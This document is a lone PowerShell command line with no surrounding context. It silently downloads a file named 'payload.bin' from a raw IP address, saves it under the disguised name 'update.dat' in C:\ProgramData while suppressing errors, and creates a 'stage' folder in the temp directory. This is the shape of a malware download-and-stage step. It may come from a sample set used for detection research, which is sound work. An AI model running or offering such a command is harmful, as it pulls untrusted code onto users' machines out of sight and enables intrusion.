
Invoke-WebRequest -Uri "http://203.0.113.209/downloads/payload.bin" -OutFile 'C:\ProgramData\update.dat' -UseBasicParsing -ErrorAction SilentlyContinue; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
